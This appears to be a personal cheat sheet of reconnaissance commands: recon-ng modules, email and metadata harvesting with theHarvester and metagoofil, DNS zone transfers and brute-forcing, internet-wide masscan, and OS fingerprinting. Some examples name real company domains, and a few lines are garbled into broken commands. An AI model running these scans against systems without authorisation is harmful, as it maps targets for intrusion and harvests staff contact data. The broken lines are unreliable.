Copy the API key, re-open the terminal window, and run the following command to add the key:

Keys add twitter_api <your-copied-api-key>
Now use the following command to enter the twitter_secret in recon-ng:

keys add  twitter_secret <you_twitter_secret>



add the Shodan API key. Adding the Shodan API key is fairly simple; all you need to do is create an account at https://shodan.io and click on My Account in the top-right corner. You will see the Account Overview page, where you can see a QR code image and API key,

Copy the API key shown in your account and add that in recon-ng using the following command:

keys add shodan_api <apikey>



show modules
use recon/domains-vulnerabilities/punkspider

Show module
use recon/domains-vulnerabilities/xssed
Show Options
Set source Microsoft.com
Show Options
RUN









use	recon/contacts/gather/http/api/whois_pocs
[recon‐ng][default][whois_pocs] > show options
[recon-­ng][default][whois_pocs] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][recon-­ng][default][whois_pocs] > run

use recon/hosts/enum/http/web/xssed
[recon‐ng][xssed] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][xssed] > run

[recon‐ng]> use recon/hosts/gather/http/web/google_site
[recon‐ng][google_site] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][google_site] > run

[recon‐ng]> use recon/hosts/gather/http/web/ip_neighbor
[recon‐ng][ip_neighbor] > set SOURCE cisco.com
SOURCE => cisco.com
[recon‐ng][ip_neighbor] > run





##  DNS   forward   brute-­‐‐force   enumeration
for ip in $(cat list.txt);do host $ip.megacorpone.com;done


## probing  the  range  of  these found addresses  in  a  loop
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -­‐v "not found"






ffprobe -show_streams $File
ffprobe -show_packets $File



GraphicsMagick


##-===================================-##
##   [+] Verbose Image Information
##-===================================-##
gm -identify -verbose $File


##-==========================================-##
##   [+] Extremely Verbose Debugging Info
##-==========================================-##
gm -identify -verbose -debug all $File


mogrify -strip $HOME/$Directory

+profile "*"					## remove all profiles
+profile "'*'" "'$File'"
+profile iptc


##-================================================-##
##   [+] print Exif data contained in the file:
##-================================================-##
gm -identify -format %[EXIF:$Tag]
gm -identify -format %[EXIF:*] 					## print all Exif tags
gm -identify -format %[EXIF:GPSInfo]			## print GPSInfo Exif tags
gm -identify -format %[EXIF:MakerNote]			## print MakerNote Exif tags
gm -identify -format %[EXIF:UserComment]		## print UserComment Exif tags







##-================================-##
##   [+] Extract Image Metadata:
##-================================-##
exif $File.jpg
exiftags -idav $File.jpg
exifprobe $File.jpg
exiv2 -Pkyct $File.jpg
exiftool -verbose -extractEmbedded $File.jpg
exiftool -a -G1 -s $File.jpg

##-======================================-##
##   [+] Extract Date/Time Information:
##-======================================-##
exiftool -time:all -a -G0:1 -s $File.jpg
exiftool -a -u -g1 $File.jpg


##-========================================-##
##   [+] Remove Metadata From $Dst image:
##-========================================-##
exiftool -all=  $File.png


##-=====================================-##
##   [+] Copy Values of Writable Tags
##   [+] From "src.jpg" To "$Dst.jpg"
##-=====================================-##
exiftool -TagsFromFile $Src.jpg -all:all $Dst.jpg


##-========================================-##
##   [+] Erase All Metadata From $Dst.jpg
##-========================================-##
##   [+] Copy The EXIF Tags From:
## -------------------------------- ##
##   [+] $Src.jpg -> $Dst.jpg
## -------------------------------- ##
exiftool -all= -tagsfromfile $src.jpg -exif:all $Dst.jpg


##-===================================-##
##   [+] Copy/Overwrite All Metadata
##-===================================-##
## ----------------------------------- ##
##   [?] "$Src.jpg" --> "$Dst.jpg"
## ----------------------------------- ##
##   [+] Delete All XMP Information
## ----------------------------------- ##
##   [+] Delete Thumbnail From $Dst
## ----------------------------------- ##
exiftool -tagsFromFile $a.jpg -XMP:All= -ThumbnailImage= -m $b.jpg



##-=================================-##
##   [+] Copy Metadata Information
##-=================================-##
## --------------------------------- ##
##   [?] $Src.jpg -> XMP Data File
## --------------------------------- ##
exiftool -Tagsfromfile $a.jpg $out.xmp













hachoir-metadata --level=9
hachoir-metadata --parser-list
hachoir-metadata --debug
hachoir-metadata --log=$File

hachoir-strip --strip=useless
hachoir-strip --strip=metadata



pdfextract $File.pdf


pdfxray_lite -f $File.pdf -r rpt_


peepdf -i




pdfid --verbose --scan $File.pdf

pdfid --verbose --scan --disarm --extra --output=$LogFile $File.pdf

pdfid --verbose --scan --disarm --all --output=$LogFile $File.pdf

pdfid --verbose --extra --scan $File.pdf

pdfid --verbose --plugins=$Plugin --scan $File.pdf



exiftool -exif:all		## Display metadata
exiftool -exif:all=		## Remove all metadata

exiftool -a -u -g1 $File
exiftool -k -a -u -g1 -w $OutFile $File


##-===============================================-##
##   [+]
##-===============================================-##
exiftool ­All= $File.jpg
jpegtran -copy all -outfile "$1"



dumppdf -a		# Dump all the objects. By default only the document trailer is printed.

dumppdf -i objno[,objno,...]		# Specifies PDF object IDs to display. Comma-separated IDs, or multiple -i options are accepted.

dumppdf -p pageno[,pageno,...]
           Specifies the comma-separated list of the page numbers to be
           extracted.

dumppdf -r option, the “raw” stream contents are dumped without
           decompression
           -b option, the decompressed contents are dumped
           as a binary blob.

dumppdf -t option, the decompressed contents are
           dumped in a text format, similar to repr() manner.
dumppdf -r or -b
           option is given, no stream header is displayed for the ease of
           saving it to a file.
dumppdf -T
           Show the table of contents.

dumppdf -P password
           Provides the user password to access PDF contents.

dumppdf -d
           Increase the debug level.


Dump all the headers and contents, except stream objects:
dumppdf -a $File.pdf

Dump the table of contents:
dumppdf -T $File.pdf

Extract a JPEG image:
dumppdf -r -i6 $File.pdf > $File.jpeg





## ----------------------------------------------------------------- ##
##   [+] metagoofil - information gathering tool designed
##                    for extracting metadata of public documents
##                    (pdf,doc,xls,ppt,docx,pptx,xlsx)
## ----------------------------------------------------------------- ##
metagoofil -d $Domain -t $File,pdf -l 100 -n 3 -o $DomainFiles
exiftool -r *.doc | egrep -i "Author|Creator|Email|Producer|Template" | sort -u



metagoofil -d uk.ibm.com -t doc,pdf -l 200 -n 50 -o ibmfiles

theharvester -d $Domain -b googleCSE -l 500 -s 300
metagoofil -d sina.com -t pdf -l 200 -o test -f 1.html

metagoofil -d $Domain -t doc,pdf -l 200 -n 50 -o $Files -f $Results.html
metagoofil -h yes -o $Files -f $Results.html		## (local dir analysis)



metagoofil.py -d $target -t doc,xls,docx -l 200 -n 50 -o ~/Desktop/$target/metagoofil.tmp/ -f ~/Desktop/$target/users.html
cat ~/Desktop/$target/users.html | sed 's/useritem/\n/g' | grep '">' | grep -vE 'head' | awk -F "<" {'print $1'} | cut -d">" -f2 | sed -e "s/^ \{1,\}//" >> ~/Desktop/$target/users.txt



metagoofil -d $Domain -w -t pdf,doc,xls,ppt,docx,ppt -o $File


metagoofil -d $Domain -t $Filetype,$Filetype -l “# of results” -n “# of downloads” -o “specify directory to save in” -f “specify name and location of file save”


metagoofil -d $Domain -t $Filetype,$Filetype -l $NumResults -n $NumDownloads -o ~/$Dir/ -f /$Dir/$File.html

metagoofil -d $Domain -t $Filetype,$Filetype -l $NumResults -n $NumDownloads -o ~/$Dir/ -f /$Dir/$File.html

metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o ~/Downloads/metagoofil/ -f /root/Desktop/metagoofil/$Results.html

metagoofil -d $Domain -w -t pdf,doc,xls,ppt,docx,ppt -o $File


metagoofil -d <target>.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html



##-====================================-##
##   [+] find subdomains available:
##-====================================-##
goorecon -s $Domain


##-==========================================-##
##   [+] Find email addresses for Domain:
##-==========================================-##
goorecon -e $Domain




## --------------------------------------------------------------------------------------------------- ##
theHarvester -d $Domain -l 50 -b google
theHarvester -d $Domain -l 50 -b bing
theHarvester -d $Domain -l 50 -b linkedin
## --------------------------------------------------------------------------------------------------- ##
theHarvester -d $Domain -b all		    ## Search all, google, googleCSE, bing, bingapi, pgp,
theHarvester -d $Domain -b pgp          ##  > linkedin,google-profiles, jigsaw, twitter, googleplus
theHarvester -d $Domain -b bing
theHarvester -d $Domain -b google
theHarvester -d $Domain -b twitter
theHarvester -d $Domain -b jigsaw
theHarvester -d $Domain -b linkedin
## --------------------------------------------------------------------------------------------------- ##
theHarvester -d $Domain -n		        ## Perform a DNS reverse query on all ranges discovered
theHarvester -d $Domain -c		        ## Perform a DNS brute force for the domain name
theHarvester -d $Domain -t		        ## Perform a DNS TLD expansion discovery
theHarvester -d $Domain -e $DNS		    ## Specfic a dns server
theHarvester -d $Domain -h		        ## use SHODAN database to query discovered hosts
## --------------------------------------------------------------------------------------------------- ##
theharvester -d $Domain -l 500 -b google -h $Domain.html
theharvester -d $Domain -b pgp
theharvester -d $Domain -l 200 -b linkedin
theharvester -d $Domain -b googleCSE -l 500 -s 300
## --------------------------------------------------------------------------------------------------- ##


##-==========================-##
##  [+] Harvester - Flags
##-==========================-##
theharvester -d $Domain -l $Limit -b $DataSource


##-=======================================-##
##  [+] Harvester Data Source - Twitter
##-=======================================-##
theharvester -d $Domain -l 500 -b twitter







##-==========================-##
##  [+] Harvester - Flags
##-==========================-##
theharvester -d $Domain -l $Limit -b $DataSource


##-===================================================-##
##  [+] Harvester Data Source - All Search Engines
##-===================================================-##
theharvester -d url -l 500 -b all -b all = all search engines


##-=======================================-##
##  [+] Harvester Data Source - Google
##-=======================================-##
theharvester -d $Domain -l 500 -b google
theharvester -d $Domain -b google > google.txt


##-=======================================-##
##  [+] Harvester Data Source - Twitter
##-=======================================-##
theharvester -d $Domain -l 500 -b twitter


##-======================================================-##
##  [+] Use SHODAN database to query discovered hosts
##-======================================================-##
theharvester -d $Domain -h > $Domain-SHODAN-Query.txt






##-=================================================================-##
##   [+]
##-=================================================================-##
automater -s robtex $IP



tracepath



tcptraceroute -i eth0 $Domain



mtr



nmap -PN -n -F -T4 -sV -A -oG $File.txt $Domain



amap -d $IP $PORT





browse to
http://127.0.0.1/unicornscan

­epgsqldb


unicornscan -v $IP                 ## runs the default TCP SYN scan
unicornscan -v -m U $IP            ## scan type is supposed to be UDP
unicornscan X.X.X.X:a -r10000 -v
unicornscan 192.168.0.0/24:139				## network wide scan on port 139:

unicornscan -mT -I 10.11.1.252:a -v
unicornscan -mU -I 10.11.1.252:p -v

unicornscan -mU -I 192.168.24.53:a -v -l unicorn_full_udp.txt ;  unicornscan -mT -I 192.168.24.53:a -v -l unicorn_full_tcp.txt




nslookup -> set type=any -> ls -d $Domain.com
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done



##-==============-##
##  [+] MTR
##-==============-##
mtr $Domain





## ----------------------------------------------------------------------------------------- ##
	host -t ns $Domain.com                    # Show name servers
## ----------------------------------------------------------------------------------------- ##
	host -t mx $Domain.com                    # Show mail servers
## ----------------------------------------------------------------------------------------- ##
	host $Domain.com
## ----------------------------------------------------------------------------------------- ##
	host -l $Domain.com $NameServer          # Zone transfer
## ----------------------------------------------------------------------------------------- ##
	host -C $Domain							## SOA Records
## ----------------------------------------------------------------------------------------- ##
	host -a $Domain
## ----------------------------------------------------------------------------------------- ##
	host $IP
## ----------------------------------------------------------------------------------------- ##
	host -4
## ----------------------------------------------------------------------------------------- ##
	host -6
## ----------------------------------------------------------------------------------------- ##






##-===============================================================-##
##  [+] Use a bash loop to find the IP address behind each host
##-===============================================================-##
for url in $(cat list.txt); do host $url; done

##-=========================================================================-##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
##-=========================================================================-##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn



## ----------------------------------------------------------------------------------------- ##
	dig +short +identify $Server				## see what name server
												## or whose cache is providing answers
## ----------------------------------------------------------------------------------------- ##
    dig +trace $Domain.com                      ## Debug DNS Tracing
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep status				## receive the NXDOMAIN status.
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep Query				## query time only
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com $Type                    	## a, mx, ns, soa, srv, txt, any
## ----------------------------------------------------------------------------------------- ##
	dig -x $TargetIP							## Pointer records
## ----------------------------------------------------------------------------------------- ##
	dig @$NameServerIP $Domain.com axfr			## Zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @$NameServerIP $Domain.com afro			## Forward zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @$IPAddr $Domain +norecurse				## Non recursive query (cache lookup)
## ----------------------------------------------------------------------------------------- ##
	dig MX +short $Domain						## Perform MX Record Lookup
## ----------------------------------------------------------------------------------------- ##
	dig +short -t txt $@					    ## Sender Policy Framework (SPF) record
## ----------------------------------------------------------------------------------------- ##
	dig ns $Domain								## List the Name Servers for google.com
## ----------------------------------------------------------------------------------------- ##
	dig a $Domain.com @$Nameserver				## Perform DNS IP Lookup
## ----------------------------------------------------------------------------------------- ##



##-============================================-##
##  [+] Query Wikipedia via console over DNS
##-============================================-##
dig +short txt <keyword>.wp.dg.cx


##-=============================-##
##  [+] Dig Debug DNS Tracing
##-=============================-##
dig +trace $Domain


##-==================================================-##
##  [+] Extract your external IP address using dig
##-==================================================-##
dig +short myip.opendns.com @resolver1.opendns.com


##-==================================================-##
##  [+] Reverse domain name resolution (PTR record)
##-==================================================-##
dig -x 220.181.14.155 +noall +answer




dig $Domain +nssearch



dig $Domain +nssearch | cut -d' ' -f4,11



dig +onesoa +nocomments +nocmd +nostats AXFR


dig +onesoa +nocomments +nocmd +nostats AXFR  @161.97.219.84



dig_tld () {
  /usr/bin/dig +onesoa +nocomments +nocmd +nostats AXFR $1 @$2 > output/$1.zone
  sed "/NSEC\|RRSIG\|DNSKEY\|SOA\|^$1\./d" < output/$1.zone > output/include/$1.zone
}

/usr/bin/dig +onesoa +nocomments +nocmd +nostats AXFR \. @161.97.219.84 > output/root.zone
sed "/NSEC\|RRSIG\|DNSKEY\|SOA\|^\./d" < output/root.zone > output/include/root.zone


dig +onesoa +nocomments +nocmd +nostats AXFR $1 @$2

query=""
for type in {A,AAAA,ALIAS,CNAME,MX,NS,PTR,SOA,SRV,TXT,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM,RRSIG,AFSDB,ATMA,CAA,CERT,DHCID,DNAME,HINFO,ISDN,LOC,MB,MG,MINFO,MR,NAPTR,NSAP,RP,RT,TLSA,X25} ; do
  dig +noall +short +noshort +answer $query $type ${1} 2>/dev/null
done





Query DNS bind version information Most DNS servers use BIND to query the version information of bind,
 not all DNS servers can query BIND information,
 most dns servers The protection mode is set
 and cannot be queried in this way.


dig +noall +answer $Domain ns


dig +noall +answer txt chaos VERSION.BIND ns3.sina.com.cn.






/etc/systemd/resolved.conf

DNS=

resolvectl status
resolvectl query




## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com					## Query A and PTR Records
## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com x.x.x.x			## Query A and PTR record
											## using a different name server
## ----------------------------------------------------------------------------------------- ##
	nslookup -debug google.com				## Debug Mode for nslookup
## ----------------------------------------------------------------------------------------- ##
	nslookup -query=ns $Domain.com			## Query Nameserver records
## ----------------------------------------------------------------------------------------- ##
	nslookup -querytype=mx $Domain.com		## Query MX record
## ----------------------------------------------------------------------------------------- ##
	nslookup set type=mx $Domain.com		## Interactive option
## ----------------------------------------------------------------------------------------- ##
	nslookup -norecursive $Domain.com		## Non Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup recursive $Domain.com			## Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup ns4.google.com					## Resolve the IP Address for ns4.google.com
## ----------------------------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Target		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##



##-==========================-##
##  [+] DNS zone transfer
##-==========================-##

nslookup server $Server set type=any ls -d $Target		## DNS zone transfer


##-==================================================-##
##  [+] return verbose information about a record
##-==================================================-##
set debug




dig $Domain.com +nssearch



dig $Domain.com +nssearch | cut -d' ' -f4,11





DNS lookups
Zone Transfers


whois $Domain.com
dig {a|txt|ns|mx} $Domain.com
dig {a|txt|ns|mx} $Domain.com @ns1.domain.com


host -t {a|txt|ns|mx} $Domain.com
host -a $Domain.com
host -l $Domain.com ns1.$Domain.com


host -T -l $Domain ns4.$Domain


dnsrecon -d $Domain.com -t axfr @ns2.$Domain.com


dnsenum $Domain.com


dnsrecon -d $Domain --lifetime 10 -t brt -D usr/share/dnsrecon/namelist.txt -x sina.xml



##-==================================================-##
##  [+] Dnsrecon DNS Brute Force

dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml $File.xml



dnsenum -f /usr/share/dnsenum/dns.txt -dnsserver 8.8.8.8 $Domain -o $Domain.xml



##-======================================-##
##  [+] Dnsrecon DNS List of $Domain
##-======================================-##
dnsrecon -d $Domain -t axfr



##-=================-##
##  [+] DNSEnum
##-=================-##
dnsenum $Domain




## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] enumerate DNS information of a domain and to discover non-contiguous ip blocks.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsenum --verbose --noreverse -o $File.xml $Domain



dnsenum --verbose --file /usr/share/dnsenum/dns.txt -dnsserver 8.8.8.8 $Domain -o $Domain.xml


##-===============================================-##
##  [+] Write all valid subdomains to this file.
##-===============================================-##
## ------------------------------------------------------ ##
##  [?] Subdomains are taken from: NS and MX records,
##  [?] zonetransfer, google scraping, 
##  [?] brute force and reverse lookup hostnames.
## ------------------------------------------------------ ##
dnsenum --verbose --subfile $File $Domain


##-==============================================================-##
##  [+] Read subdomains from this file to perform brute force.
##-==============================================================-##
dnsenum --verbose --file $File 


##-==============================================-##
##  [+] Recursion on subdomains
##  [+] brute force all discovered subdomains
##-==============================================-##
dnsenum --verbose --recursion $Domain


http_proxy=http://127.0.0.1:8118/
HTTP_PROXY=http://127.0.0.1:8118/




allinurl: -www site:domain







## ------------------------------------------------------------------------------- ##
	dig @127.0.0.1 NS $Domain.com				## To test the local server
	dig @204.97.212.10 NS MX $Domain.com		## Query an external server
	dig AXFR @ns1.$Domain.org @$Domain.com		## Get the full zone (zone transfer)
## ------------------------------------------------------------------------------- ##



##-=====================-##
##   [+] PING SWEEP
##-=====================-##
for x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done


##-============================-##
##   [+] DNS REVERSE LOOKUP
##-============================-##
for ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip |grep $ip dns.txt; done;


##-====================================================================-##
##   [+] Reverse Lookup Brute Force - find domains in the same range
##-====================================================================-##
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"



##-==========================================-##
##   [+] Dig - Find all of the signed TLDs:
##-==========================================-##
## ------------------------------------------ ##
##   [?] The RRSIG RRs will be supplied
## ------------------------------------------ ##
dig @xfr.lax.dns.icann.org . axfr > root-zone-file | grep DS root-zone-file





dig +dnssec $Domain.tld
dig +dnssec $Register.tld

dig +dnssec labs.nic.cz @localhost




dig @192.168.56.104 chaos version.bind txt
dig @<NameServer> chaos hostname.bind TXT
dig @<NameServer> chaos authors.bind TXT
dig @<NameServer> chaos ID.server TXT



## ----------------------------------------------------------------------------- ##
alias dns1="dig +short @resolver1.opendns.com myip.opendns.com"
alias dns2="dig +short @208.67.222.222 myip.opendns.com"
alias dns3="dig +short @208.67.220.220 which.opendns.com txt"
## ============================================================== ##


## Get your outgoing IP address

alias myip='dig +short myip.opendns.com @resolver1.opendns.com'
## ----------------------------------------------------------------------------- ##





0trace eth0 $Domain

itrace -i eth0 -d $Domain

intrace

tctrace -i eth0 -d $Domain

tcptraceroute -i eth0 $Domain



tcptrace -l -r o3 $File




##-====================================================-##
##   [+] Print List of Live Hosts on Local Network:
##-====================================================-##
genlist -s 192.168.1.\*






fierce --domain $Domain --subdomains accounts --traverse 10


##-============================================================================-##
##   [+] Limit nearby IP traversal to certain domains with the --search flag:
##-============================================================================-##
fierce --domain $Domain --subdomains admin --search $Domain $Domain


##-==================================================================================-##
##   [+] Attempt an HTTP connection on domains discovered with the --connect flag:
##-==================================================================================-##
fierce --domain $Domain --subdomains mail --connect



##-=========================-##
##  [+] Fierce
##-=========================-##
fierce -dns $Domain
fierce -dns $Domain -file $OutputFile
fierce -dns $Domain -dnsserver $Server
fierce -range $IPRange -dnsserver $Server
fierce -dns $Domain -wordlist $Wordlist
fierce -dnsserver $DNS -dns $Domain -wordlist /usr/share/fierce/hosts.txt


fierce -dns $Domain -threads 3



dnsenum.pl --enum -f $File.txt --update a -r $Domain >> ~/Enumeration/$domain



##-=====================================================================-##
##   [+] Search for the A record of $Domain on your local nameserver:
##-=====================================================================-##
dnstracer $Domain


##-=====================================================================-##
##   [+] Search for the MX record of $Domain on the root-nameservers:
##-=====================================================================-##
dnstracer "-s" . "-q" mx $Domain


##-=================================================================-##
##   [+] Search for the PTR record (hostname) of 212.204.230.141:
##-=================================================================-##
dnstracer "-q" ptr 141.230.204.212.in-addr.arpa


##-========================-##
##   [+] IPv6 addresses:
##-========================-##
dnstracer "-q" ptr "-s" . "-o" 2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.6.4.0.2.0.0.0.0.8.b.0.e.f.f.3.ip6.int



##-=================================================================-##
##   [+]
##-=================================================================-##
dnstop -l 3 eth0




dnswalk $Domain

## ------------------------------------------------------------- ##
##   [?] Print debugging and 'status' information to stderr
## ------------------------------------------------------------- ##


									## ----------------------------------------------------------- ##
dnswalk -r -d $* $Domain.		    ## Recursively descend sub-domains of the specified domain.
									## Print debugging and 'status' information to stderr
									## ----------------------------------------------------------- ##

									## ---------------------------------------------------- ##
dnswalk -F $Domain					## perform "fascist" checking
									## ---------------------------------------------------- ##
									##  [?] When checking an A record,
									##      compare the PTR name for each IP address
									##      with the forward name and report mismatches.
									## ---------------------------------------------------- ##

dmitry -p $Domain -f -b



dmitry -iwnse $Domain






##-================-##
##  [+] DNSMap
##-================-##
dnsmap -w $File.txt $Domain


## ----------------------------------------------------------- ##
##   [+] DNSenum - enumerate various DNS records, such as:
##                 NS, MX, SOA, and PTR records.
##   [?] DNSenum also tries to perform DNS zone transfer
## ----------------------------------------------------------- ##

dnsenum -p 5 -s 20 $Domain
dnsenum -f $File.txt $Domain
dnsenum -o dnsenum_info $Domain

dnsenum --enum -f $File.txt --update a -r $URL






dnsrecon -d $Domain -D /usr/share/wordlists/$File.txt -t std --xml $File.xml



## --------------------------------------------------------------------------------------- ##
    dnsrecon -t rvs -i 192.1.1.1,192.1.1.20         ## Reverse lookup for IP range:
## --------------------------------------------------------------------------------------- ##
    dnsrecon -t std -d $Domain                      ## Retrieve standard DNS records:
## --------------------------------------------------------------------------------------- ##
    dnsrecon -t brt -d $Domain -w $Hosts.txt	    ## Enumerate subdornains:
## --------------------------------------------------------------------------------------- ##
    dnsrecon -d $Domain -t axfr                     ## DNS zone transfer:
## --------------------------------------------------------------------------------------- ##
    dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
## --------------------------------------------------------------------------------------- ##
    dnsrecon -d $Host -t zonewalk                   ## Zone Walking
## --------------------------------------------------------------------------------------- ##
    dnsrecon.py -d $Domain -D $Dict -t brt          ## Domain Brute-Force
## --------------------------------------------------------------------------------------- ##



dnsrecon.py -t brt,std,axfr -D /pentest/enumeration/dns/dnsrecon/namelist.txt -d $target


##-=======================================-##
##  [+] DNSRecon - DNS Brute Force Scan
##-=======================================-##
dnsrecon -t brt -d $Domain -D /$Dir/$File.txt



fierce -dns $URL


## ---------------------------------------------------------------------------- ##
##   [+] Lbd (load balancing detector)
##   [?] detects whether a given domain uses DNS and/or HTTP load-balancing
## ---------------------------------------------------------------------------- ##
lbd.sh $URL


## ---------------------------------------------------------------------- ##
##   [?] Halberd - HTTP-based load balancer detector.
##   [?]           checks for differences in the
##   [?]           HTTP response headers, cookies, timestamps, etc.
## ---------------------------------------------------------------------- ##
halberd $Domain




fragroute -f $Location $IP

fragrouter -i eth0 $options




nmap -n -Pn -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me $Domain

nmap -PN -n -F -T4 -sV -A -oG $File.txt $URL

dnsenum --dnsserver $DNS --enum -f $File.txt --update a -r $URL

nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr $URL

amap -d $IP $PORT
amap -bqv 192.168.1.15 80




##-===============================================-##
##   [+]
##-===============================================-##



-a (alive)
-g (generate the host target list from cidr notation)
-c (count)
-p (period=msec)
-s (stats)
-C (per-target statistics)
-d (reverse-DNS lookup) -q (quiet)
-s (print cumulative statistics upon exit)


## ---------------------------------------------------------------------- ##
	fping -a -q -g $2				## Generate Alive Hosts From File
## ---------------------------------------------------------------------- ##
	fping -g $IP $IP				## Generate Host List:
## ---------------------------------------------------------------------- ##
	fping -s $Domain				## Display Statistics:
## ---------------------------------------------------------------------- ##
	fping < $File					## ping addresses read from a file
## ---------------------------------------------------------------------- ##
	fping -ag 192.0.2.0/24			## Find hosts in a given subnet
## ---------------------------------------------------------------------- ##
	fping $IP -s -c 10000 -p 100	## send high rate of
									## echo-request packets
## ---------------------------------------------------------------------- ##


## --------------------------------------------------------- ##
##   [?] Use fping to test reachability to range of hosts
##       using bash for loop to define hosts
## --------------------------------------------------------- ##
for i in {1..5} ; do fping -C 3 -d -q -s -g 10.0.2$i.100 10.0.2$i.150 ; done








##-===============================================-##
##   [+] nping - Network packet generation tool
##-===============================================-##



## ---------------------------------------------------------------------- ##
##   [?] Echo Mode - see how the generated probes change in transit
##   [?] Revealing the differences between the transmitted packets
##   [?] And the packets received at the other end
## ---------------------------------------------------------------------- ##



##-================================-##
##   [+] nping - TCP Probe Mode:
##-================================-##
nping -c 1 --tcp -p 80,433 $Domain




nping --tcp-connect			## Unprivileged TCP connect probe mode.
nping --tcp					## TCP probe mode.
nping --udp					## UDP probe mode.
nping --icmp				## ICMP probe mode.
nping --arp					## ARP/RARP probe mode.
nping --traceroute			## Traceroute mode



##-================================-##
##   [+] nping - TCP CONNECT MODE
##-================================-##
nping --dest-port					## Set destination port(s)
nping --source-port $Port			## Try to use a custom source port



nping --interface



##-================================-##
##   [+] nping - IPv6 OPTIONS:
##-================================-##
nping --IPv6
nping --dest-ip


nping --dest-mac					## Set destination mac address
nping --source-mac <mac>               ## Set source MAC address.
nping --ether-type <type>			## Set EtherType value.




nping --source-ip $SrcAddr		## Set source IP address.
nping --dest-ip $DstAddr		## Set destination IP address
nping --tos $TOS				## Set type of service field (8bits).
nping --id  $ID					## Set identification field (16 bits).
nping --df						## Set Dont Fragment flag.
nping --mf						## Set More Fragments flag.
nping --ttl $Hops				## Set time to live

nping -send-eth                       : Send packets at the raw ethernet layer.
nping --send-ip                        : Send packets using raw IP sockets.
nping --bpf-filter <filter spec>       : Specify custom BPF filter




nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1
nping --icmp --icmp-type time --delay 500ms 192.168.254.254
nping --echo-server "public" -e wlan0 -vvv
nping --echo-client "public" $Domain --tcp -p1-1024 --flags ack


nping -c 1 --tcp -p 22 --flags syn $IP

nping -tcp -p 445 -data hexdata(AF56A43D) $IP







amass -src -ip -active -exclude crtsh -d $DOMAIN
amass -src -ip -active -brute --min-for-recursive 3 -exclude crtsh -w $WORDLIST -d $DOMAIN




##-==============================================-##
##   [+] Run massdns to determine online hosts
##-==============================================-##
massdns -r $RESOLVERS -q -t A -o -S -w $File.out $File-merged.txt
cat $File.out | awk '{print $1}' | sed 's/\.$//' | sort -u >> $File-online.txt


massdns -r lists/resolvers.txt -t A -q -o S $File.txt


##-============================================================================-##
##   [+] Produce a list of IP addresses corresponding to the target's FQDNs:
##-============================================================================-##
cat $File.out | awk '{split($0,a," "); print a[3]}' | sort | uniq >> $File-FQDNs.txt








Masscan
masscan -p8983 --range 0.0.0.0/0 --banners --rate 100000000 -oG masscanips
masscan --udp-ports 161


grep ipaddresses with regex

grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $File.txt
grep -oP '(?<=Host: )\S*' $File




masscan -p1-65535 $(dig +short $1|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head - --max-rate 1000





## ------------------------------------------------- ##
##   [?] p0f - passive os fingerprinting utility
## ------------------------------------------------- ##
p0f -i eth0
p0f -i wlan0


##-=========================================================-##
##   [+] Set iface to promiscuous mode, dump to log file:
##-=========================================================-##
p0f -i eth0 -p -d -o $File.log
p0f -i wlan0 -p -d -o $File.log


##-============================================-##
##   [+] p0f - Read from offline PCAP $File:
##-============================================-##
p0f -r $File 


##-======================================================-##
##   [+] p0f - Filter Traffic - Source Port - FTP-Data
##-======================================================-##
p0f -r $File 'src port ftp-data'
p0f -i wlan0 'src port ftp-data'


##-====================================================================================-##
##   [+] p0f - Filter Traffic - NOT Destination Network 10.0.0.0 & Netmask 255.0.0.0
##-====================================================================================-##
p0f -r $File 'not dst net 10.0.0.0 mask 255.0.0.0'
p0f -i wlan0 'not dst net 10.0.0.0 mask 255.0.0.0'


##-=============================================================-##
##   [+] p0f - Filter Traffic - Destination Port 80 & $SrcIP
##-=============================================================-##
p0f -r $File 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'
p0f -i wlan0 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'



## ----------------------------------------------------------- ##
##   [?] WAFW00F - Web Application Firewall Detection Tool
## ----------------------------------------------------------- ##
wafw00f $Domain




arachni http://$TARGET --report-save-path=$ARACHNI_REPORT_DIR/$TARGET --output-only-positives --scope-include-subdomains





## ------------------------------------------------- ##
##   [+] Xprobe2 OS fingerprinting
## ------------------------------------------------- ##
##   [?] fuzzy signature matching to provide
##       the probable operating system assessment
## ------------------------------------------------- ##
xprobe2 $IP

xprobe2 -v -p tcp:80:open $IP
xprobe2 -v -p tcp:80:open 192.168.6.66


